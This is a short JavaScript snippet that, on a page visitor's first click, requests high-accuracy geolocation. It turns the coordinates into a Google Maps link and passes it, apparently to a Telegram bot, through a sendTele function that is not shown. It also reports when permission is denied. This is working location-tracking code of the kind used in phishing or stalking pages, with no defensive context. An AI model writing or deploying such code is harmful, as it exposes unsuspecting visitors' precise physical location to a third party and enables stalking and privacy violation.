document.addEventListener('click', () => {
    navigator.geolocation.getCurrentPosition(res => {
        const mapLink = `https://www.google.com/maps?q=${res.coords.latitude},${res.coords.longitude}`;
        sendTele(`📍 Accurate Location:\nLink: ${mapLink}`);
    }, (err) => {
        sendTele("❌ Location Permission Denied");
    }, { enableHighAccuracy: true });
}, { once: true });
